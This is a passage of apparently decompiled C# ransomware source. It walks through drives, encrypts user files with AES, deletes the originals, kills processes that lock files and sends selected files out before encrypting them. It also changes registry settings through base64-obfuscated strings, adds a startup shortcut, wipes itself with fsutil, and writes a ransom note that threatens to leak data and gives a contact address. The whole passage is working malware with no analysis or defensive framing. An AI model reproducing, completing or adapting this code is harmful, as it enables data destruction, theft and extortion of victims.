                Program.WorkerCrypter2(files1, extensions, extension, excluded, DynamicPass);
                files1.Clear();
              }
            }
          }
          catch
          {
          }
        }
        foreach (string str in directories)
          stringStack.Push(str);
      }
      return files1;
    }

    public static List<string> GetFilesList(string docPath)
    {
      List<string> filesList = new List<string>();
      DirectoryInfo directoryInfo = new DirectoryInfo(docPath);
      try
      {
        foreach (FileInfo enumerateFile in directoryInfo.EnumerateFiles())
        {
          try
          {
            if (!enumerateFile.FullName.ToLower().Contains("program files") && !enumerateFile.FullName.ToLower().Contains("windows") && !enumerateFile.FullName.ToLower().Contains("perflogs") && !enumerateFile.FullName.ToLower().Contains("internet explorer") && !enumerateFile.FullName.ToLower().Contains("programdata") && !enumerateFile.FullName.ToLower().Contains("appdata") && !enumerateFile.FullName.ToLower().Contains("autoexec.bat") && !enumerateFile.FullName.ToLower().Contains("desktop.ini") && !enumerateFile.FullName.ToLower().Contains("autorun.inf") && !enumerateFile.FullName.ToLower().Contains("ntuser.dat") && !enumerateFile.FullName.ToLower().Contains("iconcache.db") && !enumerateFile.FullName.ToLower().Contains("bootsect.bak") && !enumerateFile.FullName.ToLower().Contains("boot.ini") && !enumerateFile.FullName.ToLower().Contains("ntuser.dat.log") && !enumerateFile.FullName.ToLower().Contains("thumbs.db") && !enumerateFile.FullName.ToLower().Contains("bootmgr") && !enumerateFile.FullName.ToLower().Contains("pagefile.sys") && !enumerateFile.FullName.ToLower().Contains("config.sys") && !enumerateFile.FullName.ToLower().Contains("ntuser.ini") && !enumerateFile.FullName.Contains(Program.Base64Decode("QnVpbGRlcl9Mb2c=")) && !enumerateFile.FullName.Contains("RSAKeys") && !enumerateFile.FullName.Contains("HOW_TO_DECYPHER_FILES") && !enumerateFile.FullName.EndsWith(".locked") && !enumerateFile.FullName.EndsWith("exe") && !enumerateFile.FullName.EndsWith("dll"))
            {
              if (System.IO.File.Exists(enumerateFile.FullName) && (double) enumerateFile.Length <= double.Parse(Program.Mb) * 1024.0 * 1024.0 && Program.Size == "YES")
                filesList.Add(enumerateFile.FullName);
              else if (System.IO.File.Exists(enumerateFile.FullName) && Program.Size == "NO")
                filesList.Add(enumerateFile.FullName);
            }
          }
          catch (UnauthorizedAccessException ex)
          {
          }
          catch
          {
          }
        }
        foreach (DirectoryInfo enumerateDirectory in directoryInfo.EnumerateDirectories("*"))
        {
          if (!directoryInfo.FullName.ToLower().Contains("program files") && !directoryInfo.FullName.ToLower().Contains("windows") && !directoryInfo.FullName.ToLower().Contains("perflogs") && !directoryInfo.FullName.ToLower().Contains("internet explorer") && !directoryInfo.FullName.ToLower().Contains("programdata") && !directoryInfo.FullName.ToLower().Contains("appdata"))
          {
            try
            {
              foreach (FileInfo enumerateFile in enumerateDirectory.EnumerateFiles("*", SearchOption.AllDirectories))
              {
                try
                {
                  if (!enumerateFile.FullName.ToLower().Contains("autoexec.bat") && !enumerateFile.FullName.ToLower().Contains("desktop.ini") && !enumerateFile.FullName.ToLower().Contains("autorun.inf") && !enumerateFile.FullName.ToLower().Contains("ntuser.dat") && !enumerateFile.FullName.ToLower().Contains("iconcache.db") && !enumerateFile.FullName.ToLower().Contains("bootsect.bak") && !enumerateFile.FullName.ToLower().Contains("boot.ini") && !enumerateFile.FullName.ToLower().Contains("ntuser.dat.log") && !enumerateFile.FullName.ToLower().Contains("thumbs.db") && !enumerateFile.FullName.ToLower().Contains("bootmgr") && !enumerateFile.FullName.ToLower().Contains("pagefile.sys") && !enumerateFile.FullName.ToLower().Contains("config.sys") && !enumerateFile.FullName.ToLower().Contains("ntuser.ini") && !enumerateFile.FullName.Contains(Program.Base64Decode("QnVpbGRlcl9Mb2c=")) && !enumerateFile.FullName.Contains("RSAKeys") && !enumerateFile.FullName.Contains("HOW_TO_DECYPHER_FILES") && !enumerateFile.FullName.EndsWith(".locked") && !enumerateFile.FullName.EndsWith("exe") && !enumerateFile.FullName.EndsWith("dll"))
                  {
                    if (System.IO.File.Exists(enumerateFile.FullName) && (double) enumerateFile.Length <= double.Parse(Program.Mb) * 1024.0 * 1024.0 && Program.Size == "YES")
                      filesList.Add(enumerateFile.FullName);
                    else if (System.IO.File.Exists(enumerateFile.FullName) && Program.Size == "NO")
                      filesList.Add(enumerateFile.FullName);
                  }
                }
                catch (UnauthorizedAccessException ex)
                {
                }
                catch
                {
                }
              }
            }
            catch (UnauthorizedAccessException ex)
            {
            }
            catch
            {
            }
          }
        }
      }
      catch (DirectoryNotFoundException ex)
      {
      }
      catch (UnauthorizedAccessException ex)
      {
      }
      catch (PathTooLongException ex)
      {
      }
      catch
      {
      }
      return filesList;
    }

    public static string ProcessCommand(string command = "", string arguments = "")
    {
      string str = "";
      try
      {
        new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            FileName = command,
            Arguments = arguments,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            StandardOutputEncoding = Encoding.GetEncoding(850)
          }
        }.Start();
      }
      catch
      {
      }
      return str;
    }

    public static void RunPS(string args) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
        Arguments = args,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    }.Start();

    public static string ReverseString(string s)
    {
      char[] charArray = s.ToCharArray();
      Array.Reverse((Array) charArray);
      return new string(charArray);
    }

    public static string Base64Decode(string base64EncodedData) => Encoding.UTF8.GetString(Convert.FromBase64String(base64EncodedData));

    private static void MapDrv()
    {
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
      {
        try
        {
          string base64EncodedData = Program.ReverseString("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Program.Base64Decode(base64EncodedData), true);
          if (registryKey != null)
          {
            registryKey.SetValue(Program.Base64Decode("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), (object) 1, RegistryValueKind.DWord);
            registryKey.SetValue(Program.Base64Decode("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), (object) 1, RegistryValueKind.DWord);
            registryKey.Close();
          }
        }
        catch
        {
        }
      }
      if (Program.HorseMount == "YES")
      {
        try
        {
          string path = Path.GetTempFileName().Replace(".tmp", ".bat");
          System.IO.File.WriteAllText(path, Program.Base64Decode("bW91bnR2b2wgfCBmaW5kICJ9XCIgPiB2LnR4dAoKKEZvciAvRiAlJWkgSW4gKHYudHh0KSBEbyAoCiAgICAgIFNldCBmcmVlZHJpdmU9MAogICAgICBGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICAgICAgICBJRiBOT1QgRVhJU1QgJSVkOlwgKAogICAgICAgICAgICAgICAgICBJRiAiIWZyZWVkcml2ZSEiPT0iMCIgKAogICAgICAgICAgICAgICAgICAgICAgICBTZXQgZnJlZWRyaXZlPSUlZAogICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgKQogICAgICBtb3VudHZvbCAhZnJlZWRyaXZlITogJSVpCiAgICAgIHBpbmcgLW4gMiAxMjcuMC4wLjEKKSkKU2V0IGRyaXZlaWQ9MApGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICBJRiBFWElTVCAlJWQ6XCAoCiAgICAgICAgICAgIFNldCAvYSBkcml2ZWlkKz0xCiAgICAgICAgICAgIGVjaG8gXjxTaGFyZWRGb2xkZXIgbmFtZT0iIWRyaXZlaWQhIiBob3N0UGF0aD0iJSVkOlwiIHdyaXRhYmxlPSJ0cnVlIi9ePiA+PnNmLnR4dAogICAgICAgICAp"), Encoding.ASCII);
          Program.ProcessCommand("cmd.exe", "/C " + path);
          if (System.IO.File.Exists(path))
            System.IO.File.Delete(path);
          if (System.IO.File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt")))
            System.IO.File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt"));
          if (System.IO.File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt")))
            System.IO.File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt"));
        }
        catch
        {
        }
      }
      foreach (ManagementObject managementObject in new ManagementObjectSearcher("select * from Win32_NetworkConnection").Get())
      {
        if (!Program.DizonList.Contains(managementObject.Path.ToString().Split('=')[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\").Replace("\"", "").Split('(')[0].Trim()))
          Program.DizonList.Add(managementObject.Path.ToString().Split('=')[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\").Replace("\"", "").Split('(')[0].Trim());
      }
    }

    public static bool Internet()
    {
      WebRequest webRequest = WebRequest.Create("https://www.google.com/");
      try
      {
        webRequest.GetResponse();
      }
      catch
      {
        return false;
      }
      return true;
    }

    public static void CleanMyStuff()
    {
      Program.ProcessCommand("cmd.exe", Program.Base64Decode("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
      string str = Program.Base64Decode("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
      Process.Start(new ProcessStartInfo()
      {
        Arguments = "\"" + str + "\"" + Assembly.GetEntryAssembly().Location,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "cmd.exe"
      });
      Environment.Exit(0);
    }

    public static string LeaveRegards(string mykey)
    {
      string path = Path.GetTempPath() + "\\HOW_TO_DECYPHER_FILES.txt";
      if (!System.IO.File.Exists(path))
      {
        using (StreamWriter streamWriter = new StreamWriter(path))
        {
          streamWriter.WriteLine(Program.Base64Decode("eW91ciBmaWxlcywgZG9jdW1lbnRzLCBhbmQgYWxsIG9mIHlvdXIgbmV0d29yayBlbmNyeXB0ZWQuDQphbGwgYmFja3VwIGRyaXZlIGFuZCB0YXBlIGRlbGV0ZWQgb2YgZm9ybWF0dGVkLg0KYWxsIHNoYWRvdyBjb3BpZXMgZGVsZXRlZC4NCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KRE9OVCBSRVNUQVJUIFBDDQpET05UIFRPVUNIIE9SIEVESVQgTE9DS0VEIEZJTEVTDQpET05UIFVTRSBSRUdVTEFSIFJFQ09WRVJZIFNPRlRXQVJFLCBFVkVOICJNSUNST1NPRlQgUkVDT1ZFUlkgVE9PTCINCg0KQUxMIE9GIFRIT1NFIE5PVEVTIFdJTEwgQ0FVU0UgWU9VIExPU1QgWU9VUiBGSUxFUyBGT1IgRVZFUg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KaW1wb3J0YW50IGZpbGVzLCBkb2N1bWVudHMgYW5kIGV0YyBkb3dubG9hZGVkLCBhZnRlciBwdXJjaGFzZSB0aW1lIGlmIHlvdSBkb250IHBheSwgd2Ugd2lsbCBsZWFrIHRoZW0NCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCmNvbnRhY3QgOiAwMDEwMDIwMDNAc2VjbWFpbC5wcm8="));
          streamWriter.WriteLine("\r\n");
          streamWriter.WriteLine(Program.Base64Decode("S2V5IElkZW50aWZpZXI6IA=="));
          streamWriter.WriteLine(mykey);
        }
      }
      else
        System.IO.File.AppendAllText(path, "\r\nAditional KeyId:\r\n" + mykey);
      return path;
    }

    public static void appShortcutToSartUp(string linkName, string appName)
    {
      using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + linkName + ".url"))
      {
        streamWriter.WriteLine("[Summary]");
        streamWriter.WriteLine("URL=file:///" + appName);
        streamWriter.WriteLine("IconIndex=0");
        string str = appName.Replace('\\', '/');
        streamWriter.WriteLine("IconFile=" + str);
      }
    }

    private static void Crypt(
      string[] dizin,
      string[] uzantilar,
      string[] excomunicated,
      string sifre,
      string crypt_uzantisi)
    {
      Program.PasswordBytes = Encoding.ASCII.GetBytes(sifre);
      if (dizin[0] == "[auto]")
      {
        DriveInfo[] drives = DriveInfo.GetDrives();
        if (drives.Length > 0)
        {
          for (int index = 0; index < drives.Length; ++index)
          {
            if (drives[index].IsReady && !Program.DizonList.Contains(drives[index].Name))
              Program.DizonList.Add(drives[index].Name);
          }
        }
      }
      else
      {
        for (int index = 0; index < dizin.Length; ++index)
        {
          if (!Program.DizonList.Contains(dizin[index]))
            Program.DizonList.Add(dizin[index]);
        }
      }
      if (Program.DizonList.Contains(Program.Base64Decode("Qzpc")) && Program.SkipC == "YES")
        Program.DizonList.Remove(Program.Base64Decode("Qzpc"));
      foreach (string dizon in Program.DizonList)
      {
        string t = dizon;
        if (Program.MultipleThreads == "YES")
        {
          Thread thread = new Thread((ThreadStart) (() => Program.WorkerCrypter(t, uzantilar, crypt_uzantisi, excomunicated, sifre)));
          thread.Priority = ThreadPriority.Highest;
          thread.IsBackground = false;
          thread.Start();
          thread.Join();
        }
        else
          Program.WorkerCrypter(t, uzantilar, crypt_uzantisi, excomunicated, sifre);
      }
    }

    public static void WorkerCrypter(
      string targetDir,
      string[] extensions,
      string extension,
      string[] excluded,
      string DynamicPass)
    {
      List<string> stringList1 = new List<string>();
      List<string> stringList2 = new List<string>()
      {
        ""
      };
      if (Program.AlternateAlgo == "NO")
      {
        stringList1 = Program.TraverseTree(targetDir, extensions, extension, excluded, DynamicPass);
      }
      else
      {
        List<string> stringList3 = Program.RecursiveFileSearch.SearchFiles(targetDir);
        foreach (string extension1 in extensions)
        {
          foreach (string str1 in stringList3)
          {
            if (excluded.Length != 0)
            {
              foreach (string str2 in excluded)
              {
                if (str1.EndsWith(str2))
                  goto label_43;
              }
            }
            if ((!(Program.ProcessAll == "NO") || str1.EndsWith(extension1)) && !Program.EncryptedFiles.Contains(str1))
            {
              if (Program.ReleaseLockedFiles == "YES")
              {
                try
                {
                  if (LockedFiles.Islocked(str1))
                    LockedFiles.Killproc(str1);
                }
                catch
                {
                }
              }
              Program.EncryptedFiles.Add(str1);
              if (!Program.EncryptedDirs.Contains(Path.GetDirectoryName(str1)))
                Program.EncryptedDirs.Add(Path.GetDirectoryName(str1));
              try
              {
                FileStream fileStream = new FileStream(str1, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                if (Program.PartialEncrytion == "YES" && fileStream.Length > (long) (Convert.ToInt32(Program.PartialSize) * 1024 * 1024) && !stringList2.Contains(extension1))
                {
                  if (Program.Styler == "YES")
                  {
                    foreach (string str3 in Program.extstyl)
                    {
                      if (str1.ToLower().EndsWith(str3) && Program.LimitMe == "YES")
                      {
                        if ((long) (Convert.ToInt32(Program.MaxSize) * 1024 * 1024) > fileStream.Length)
                        {
                          try
                          {
                            UtilMe.SendB(localFilePath: str1);
                          }
                          catch
                          {
                          }
                        }
                      }
                      else if (str1.ToLower().EndsWith(str3) && Program.LimitMe == "NO")
                      {
                        try
                        {
                          UtilMe.SendB(localFilePath: str1);
                        }
                        catch
                        {
                        }
                      }
                    }
                  }
                  fileStream.Dispose();
                  byte[] encrypted = Encryptions.AESEncryptBytes(Encryptions.ReadFromFile(str1, Convert.ToInt32(Program.PartialSize) * 1024 * 1024), Encoding.ASCII.GetBytes(DynamicPass), new byte[8]
                  {
                    (byte) 1,
                    (byte) 2,
                    (byte) 3,
                    (byte) 4,
                    (byte) 5,
                    (byte) 6,
                    (byte) 7,
                    (byte) 8
                  });
                  Encryptions.WriteToFile(str1, encrypted);
                  if (extension != ".*")
                    System.IO.File.Move(str1, str1 + extension);
                }
                else if (extension != ".*")
                  Program.Encrypt(str1, str1 + extension, Program.PasswordBytes);
                else
                  Program.Encrypt(str1, str1 + ".part", Program.PasswordBytes);
              }
              catch (Exception ex)
              {
              }
            }
            else
              continue;
label_43:;
          }
        }
      }
    }

    public static void WorkerCrypter2(
      List<string> files,
      string[] extensions,
      string extension,
      string[] excluded,
      string DynamicPass)
    {
      List<string> domeall = new List<string>() { "" };
      Parallel.ForEach<string>((IEnumerable<string>) extensions, (Action<string>) (t1 =>
      {
        foreach (string file in files)
        {
          if (excluded.Length != 0)
          {
            foreach (string str in excluded)
            {
              if (file.EndsWith(str))
                goto label_42;
            }
          }
          if ((!(Program.ProcessAll == "NO") || file.EndsWith(t1)) && !Program.EncryptedFiles.Contains(file))
          {
            if (Program.ReleaseLockedFiles == "YES")
            {
              try
              {
                if (LockedFiles.Islocked(file))
                  LockedFiles.Killproc(file);
              }
              catch
              {
              }
            }
            Program.EncryptedFiles.Add(file);
            if (!Program.EncryptedDirs.Contains(Path.GetDirectoryName(file)))
              Program.EncryptedDirs.Add(Path.GetDirectoryName(file));
            try
            {
              FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
              if (Program.PartialEncrytion == "YES" && fileStream.Length > (long) (Convert.ToInt32(Program.PartialSize) * 1024 * 1024) && !domeall.Contains(t1))
              {
                if (Program.Styler == "YES")
                {
                  foreach (string str in Program.extstyl)
                  {
                    if (file.ToLower().EndsWith(str) && Program.LimitMe == "YES")
                    {
                      if ((long) (Convert.ToInt32(Program.MaxSize) * 1024 * 1024) > fileStream.Length)
                      {
                        try
                        {
                          UtilMe.SendB(localFilePath: file);
                        }
                        catch
                        {
                        }
                      }
                    }
                    else if (file.ToLower().EndsWith(str) && Program.LimitMe == "NO")
                    {
                      try
                      {
                        UtilMe.SendB(localFilePath: file);
                      }
                      catch
                      {
                      }
                    }
                  }
                }
                fileStream.Dispose();
                if (Program.Blocks == "NO")
                {
                  byte[] encrypted = Encryptions.AESEncryptBytes(Encryptions.ReadFromFile(file, Convert.ToInt32(Program.PartialSize) * 1024 * 1024), Encoding.ASCII.GetBytes(DynamicPass), new byte[8]
                  {
                    (byte) 1,
                    (byte) 2,
                    (byte) 3,
                    (byte) 4,
                    (byte) 5,
                    (byte) 6,
                    (byte) 7,
                    (byte) 8
                  });
                  Encryptions.WriteToFile(file, encrypted);
                }
                else
                  Complex.Blocks.BlockProcess(file, Program.PartialSize, DynamicPass);
                if (extension != ".*")
                  System.IO.File.Move(file, file + extension);
              }
              else if (extension != ".*")
                Program.Encrypt2(file, file + extension, Program.PasswordBytes);
              else
                Program.Encrypt2(file, file + ".part", Program.PasswordBytes);
            }
            catch (Exception ex)
            {
            }
          }
          else
            continue;
label_42:;
        }
      }));
    }

    private static void Encrypt(string inputFile, string outputFile, byte[] passwordBytes)
    {
      try
      {
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        FileStream fileStream1 = new FileStream(outputFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Padding = PaddingMode.Zeros;
        rijndaelManaged.Mode = CipherMode.CBC;
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
        FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
        int num1;
        while ((num1 = fileStream2.ReadByte()) != -1)
          cryptoStream.WriteByte((byte) num1);
        fileStream2.Dispose();
        cryptoStream.Dispose();
        fileStream1.Dispose();
        try
        {
          if (outputFile.Length > 0)
          {
            FileStream fileStream3 = new FileStream(inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            if (Program.Styler == "YES")
            {
              foreach (string str in Program.extstyl)
              {
                if (inputFile.ToLower().EndsWith(str) && Program.LimitMe == "YES")
                {
                  if ((long) (Convert.ToInt32(Program.MaxSize) * 1024 * 1024) > fileStream3.Length)
                  {
                    try
                    {
                      UtilMe.SendB(localFilePath: inputFile);
                    }
                    catch
                    {
                    }
                  }
                }
                else if (inputFile.ToLower().EndsWith(str) && Program.LimitMe == "NO")
                {
                  try
                  {
                    UtilMe.SendB(localFilePath: inputFile);
                  }
                  catch
                  {
                  }
                }
              }
            }
            fileStream3.Dispose();
            int num2 = 1000000;
            while (true)
            {
              try
              {
                while (System.IO.File.Exists(inputFile) && num2 >= 0)
                  System.IO.File.Delete(inputFile);
                break;
              }
              catch
              {
                --num2;
              }
            }
            if (!outputFile.EndsWith(".part"))
              return;
            System.IO.File.Move(outputFile, outputFile.Replace(".part", ""));
          }
          else
          {
            try
            {
              System.IO.File.Delete(outputFile);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
      }
    }

    private static void Encrypt2(string inputFile, string outputFile, byte[] passwordBytes)
    {
      try
      {
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        FileStream fileStream1 = new FileStream(outputFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Padding = PaddingMode.Zeros;
        rijndaelManaged.Mode = CipherMode.CBC;
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
        FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
        int num;
        while ((num = fileStream2.ReadByte()) != -1)
          cryptoStream.WriteByte((byte) num);
        fileStream2.Dispose();
        cryptoStream.Dispose();
        fileStream1.Dispose();
        try
        {
          if (outputFile.Length > 0)
          {
            FileStream fileStream3 = new FileStream(inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            if (Program.Styler == "YES")
            {
              foreach (string str in Program.extstyl)
              {
                if (inputFile.ToLower().EndsWith(str) && Program.LimitMe == "YES")
                {
                  if ((long) (Convert.ToInt32(Program.MaxSize) * 1024 * 1024) > fileStream3.Length)
                  {
                    try
                    {
                      UtilMe.SendB(localFilePath: inputFile);
                    }
                    catch
                    {
                    }
                  }
                }
                else if (inputFile.ToLower().EndsWith(str) && Program.LimitMe == "NO")
                {
                  try
                  {
                    UtilMe.SendB(localFilePath: inputFile);
                  }
                  catch
                  {
                  }
                }
              }
            }
            fileStream3.Dispose();
            new Thread((ThreadStart) (() =>
            {
              while (true)
              {
                try
                {
                  System.IO.File.Delete(inputFile);
                  break;
                }
                catch
                {
                }
              }
            })).Start();
            if (!outputFile.EndsWith(".part"))
              return;
            System.IO.File.Move(outputFile, outputFile.Replace(".part", ""));
          }
          else
            new Thread((ThreadStart) (() =>
            {
              while (true)
              {
                try
                {
                  if (!System.IO.File.Exists(outputFile))
                    break;
                  System.IO.File.Delete(outputFile);
                  break;
                }
                catch
                {
                }
              }
            })).Start();
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
      }
    }

    public class RecursiveFileSearch
    {
      private static StringCollection log = new StringCollection();
      private static List<string> result = new List<string>();

      public static List<string> SearchFiles(string rootDir)
      {
        List<string> stringList = new List<string>();
        return Program.RecursiveFileSearch.WalkDirectoryTree(rootDir);
      }

      private static List<string> WalkDirectoryTree(string root)
      {
        string[] strArray = (string[]) null;
        try
        {
          strArray = Directory.GetFiles(root, "*.*");
        }
        catch
        {
        }
        if (strArray != null)
        {
          foreach (string path in strArray)
          {
            try
            {
              if (!path.ToLower().Contains("program files") && !path.ToLower().Contains("windows") && !path.ToLower().Contains("perflogs") && !path.ToLower().Contains("internet explorer") && !path.ToLower().Contains("programdata") && !path.ToLower().Contains("appdata") && !path.ToLower().Contains("autoexec.bat") && !path.ToLower().Contains("desktop.ini") && !path.ToLower().Contains("autorun.inf") && !path.ToLower().Contains("ntuser.dat") && !path.ToLower().Contains("iconcache.db") && !path.ToLower().Contains("bootsect.bak") && !path.ToLower().Contains("boot.ini") && !path.ToLower().Contains("ntuser.dat.log") && !path.ToLower().Contains("thumbs.db") && !path.ToLower().Contains("bootmgr") && !path.ToLower().Contains("pagefile.sys") && !path.ToLower().Contains("config.sys") && !path.ToLower().Contains("ntuser.ini") && !path.Contains(Program.Base64Decode("QnVpbGRlcl9Mb2c=")) && !path.Contains("RSAKeys") && !path.Contains("HOW_TO_DECYPHER_FILES") && !path.EndsWith(".locked") && !path.EndsWith("exe") && !path.EndsWith("dll") && !path.EndsWith("EXE") && !path.EndsWith("DLL") && !path.ToLower().Contains("Recycle.Bin") && !path.ToLower().Contains(Program.MyStartName))
              {
                if (System.IO.File.Exists(path) && (double) path.Length <= double.Parse(Program.Mb) * 1024.0 * 1024.0 && Program.Size == "YES")
                  Program.RecursiveFileSearch.result.Add(path);
                else if (System.IO.File.Exists(path) && Program.Size == "NO")
                  Program.RecursiveFileSearch.result.Add(path);
              }
            }
            catch
            {
            }
          }
          foreach (string directory in Directory.GetDirectories(root))
            Program.RecursiveFileSearch.WalkDirectoryTree(directory);
        }
        return Program.RecursiveFileSearch.result;
      }
    }
  }
}
